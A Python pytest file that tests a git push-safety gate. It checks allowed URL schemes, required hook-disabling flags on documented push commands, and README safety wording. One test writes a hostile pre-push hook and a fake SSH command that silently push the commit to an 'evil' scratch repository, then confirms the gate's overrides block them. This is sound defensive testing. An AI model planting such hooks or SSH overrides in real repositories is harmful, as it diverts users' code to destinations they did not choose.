"""Final destination-scheme and publisher-command contracts, including real Git probes."""
import re
import shlex

import pytest

from conftest import KIT
from test_check_mandate import REPO
from test_review_delta import destination_check, destination_repo, git  # noqa: F401


SCHEMES = [
    ("https://example.invalid/org/repo.git", True),
    ("file:///scratch/good.git", True),
    ("HTTPS://GitHub.com/org/repo.git", True),
    ("FILE:///scratch/good.git", True),
    ("ssh://example.invalid/repo", False),
    ("git://example.invalid/repo", False),
    ("http://example.invalid/repo", False),
    ("ftp://example.invalid/repo", False),
    ("x://repo", False), ("://x", False), ("a://b", False),
    ("prefixhttps://example.invalid/repo", False),
    ("git@github.com:org/repo.git", False),
]


@pytest.mark.parametrize("value,allowed", SCHEMES)
@pytest.mark.parametrize("field", ["push_urls", "push_dest"])
def test_only_https_file_schemes_real_config(destination_repo, value, allowed, field):
    root, work, good, evil, old, env = destination_repo
    # Use real config observations but read the head only from our file:// scratch repo.
    # Git's transports need not implement the gate's case-insensitive scheme contract.
    want = value if field == "push_urls" or allowed else good.as_uri()
    git(work, env, "config", "remote.origin.url", want)
    result = destination_check(root, work, want, old, env, dest=value, head_url=good.as_uri())
    assert result.returncode == (0 if allowed else 1)
    reason = "ALLOW" if allowed else ("DENY push_url_invalid" if field == "push_urls"
                                      else "DENY push_dest_invalid")
    assert result.stdout.startswith(reason)


@pytest.mark.parametrize("value,allowed", SCHEMES)
def test_go_ledger_only_https_file_schemes(value, allowed):
    from go_ledger import mandate_repo

    data = {"push_urls": {REPO: value}}
    if allowed:
        assert mandate_repo(data) == REPO
    else:
        with pytest.raises(ValueError, match="^invalid push_urls URL$"):
            mandate_repo(data)


PUSH_OVERRIDES = "-c core.hooksPath=/dev/null -c core.sshCommand= push --no-verify"
TRUST = ("The gate checks remote URLs and URL rewrites in the pushing worktree, which must "
         "be a fresh clone made by the kit's own worker. It doesn't defend against a hostile "
         ".git directory beyond disabling hooks and the SSH command.")


def publisher_step(number):
    text = (KIT / "templates/publisher.md").read_text()
    line = next(line for line in text.splitlines() if line.startswith(f"{number}. git "))
    return line.split("  ->", 1)[0].split(". ", 1)[1]


def test_rendered_publisher_push_and_read_disable_hooks():
    rendered = publisher_step(5).replace("{worktree}", "/scratch/work").replace(
        "{push_url}", "file:///scratch/good.git").replace("{new}", "a" * 40).replace(
        "{branch}", "fix")
    assert PUSH_OVERRIDES in rendered
    assert "a" * 40 + ":refs/heads/fix" in rendered
    assert "-c core.hooksPath=/dev/null ls-remote" in publisher_step(6)


DOC_PATHS = sorted([*(KIT / "templates").glob("*.md"), *(KIT / "agents").glob("*.md"),
                    *(KIT / "rules").glob("*.md"), KIT / "conductor-playbook.md",
                    KIT / "shepherd-playbook.md", KIT / "README.md"])


@pytest.mark.parametrize("path", DOC_PATHS, ids=lambda p: p.name)
def test_documented_push_and_pr_head_commands_have_overrides(path):
    text = path.read_text()
    for command in re.findall(r"\bgit (?:[^\n`;|]*? )?(?:push|ls-remote) [^\n`;|]*", text):
        if " push " in command:
            assert PUSH_OVERRIDES in command, command
        else:
            assert "-c core.hooksPath=/dev/null ls-remote" in command, command


@pytest.mark.parametrize("path", ["templates/publisher.md", "README.md"])
def test_push_worktree_trust_assumption_once(path):
    text = " ".join((KIT / path).read_text().split())
    assert text.count(TRUST) == 1
    if path == "README.md":
        safety = text.split("## Safety rules", 1)[1].split("## Symptom", 1)[0]
        assert TRUST in safety


def test_readme_explains_scp_push_urls():
    safety = " ".join((KIT / "README.md").read_text().split()).split("## Safety rules", 1)[1]
    assert "Scp-style `git@host:org/repo` values are not accepted; use `https://`." in safety


def test_publisher_real_push_disables_hostile_hook_and_ssh(destination_repo):
    root, work, good, evil, old, env = destination_repo
    import subprocess

    new = git(work, env, "rev-parse", "refs/heads/fix")
    marker, ssh_marker = root / "hook-ran", root / "ssh-ran"
    hook = work / ".git/hooks/pre-push"
    hook.write_text(f"#!/bin/sh\ntouch {shlex.quote(str(marker))}\n"
                    f"git -C {shlex.quote(str(work))} push --no-verify "
                    f"{shlex.quote(evil.as_uri())} {new}:refs/heads/fix\n")
    hook.chmod(0o700)
    ssh = root / "hostile-ssh"
    ssh.write_text(f"#!/bin/sh\ntouch {shlex.quote(str(ssh_marker))}\n"
                   f"exec git-receive-pack {shlex.quote(str(evil))}\n")
    ssh.chmod(0o700)
    git(work, env, "config", "core.sshCommand", ssh)
    result = destination_check(root, work, good.as_uri(), old, env)
    assert result.returncode == 0 and result.stdout.startswith("ALLOW")
    command = publisher_step(5)
    # --no-verify independently skips pre-push; pin the hooksPath defence too.
    assert PUSH_OVERRIDES in command
    for key, value in {"worktree": str(work), "push_url": good.as_uri(),
                       "new": new, "branch": "fix"}.items():
        command = command.replace("{" + key + "}", shlex.quote(value))
    pushed = subprocess.run(shlex.split(command), env=env, capture_output=True, text=True, timeout=30)
    assert pushed.returncode == 0, pushed.stderr
    assert not marker.exists() and not ssh_marker.exists()
    assert git(work, env, "ls-remote", good.as_uri(), "refs/heads/fix").split()[0] == new
    assert git(work, env, "ls-remote", evil.as_uri(), "refs/heads/fix").split()[0] == old
    # Positive control: the hostile hook really can push this commit to evil.
    git(work, env, "push", good.as_uri(), f"{new}:refs/heads/fix")
    assert marker.exists()
    assert git(work, env, "ls-remote", evil.as_uri(), "refs/heads/fix").split()[0] == new
